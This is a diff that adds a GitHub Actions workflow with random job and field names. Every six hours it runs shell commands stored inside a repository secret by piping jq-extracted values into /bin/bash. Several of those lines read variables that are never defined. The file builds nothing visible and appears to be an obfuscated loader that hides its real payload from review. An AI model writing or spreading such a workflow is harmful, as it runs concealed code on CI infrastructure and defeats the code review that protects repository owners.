@@ -1,0 +1,24 @@
+name: znciolkk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: znciolkk
+        env:
+          e16: ${{ secrets.e16 }}
+        run: |
+          echo $e16 | jq -r .hiykz086 | /bin/bash
+          echo $xeeu365 | jq -r .xlbrs026 | /bin/bash
+          echo $j9 | jq -r .xskf758 | /bin/bash
+          echo $z4 | jq -r .sntkj1056 | /bin/bash
+          echo $to56312 | jq -r .kue9306 | /bin/bash
+          echo $ltmgc39 | jq -r .bv4670 | /bin/bash
+          echo $w84369 | jq -r .liw157 | /bin/bash
+          echo $p69868 | jq -r .nnuv4338 | /bin/bash
+
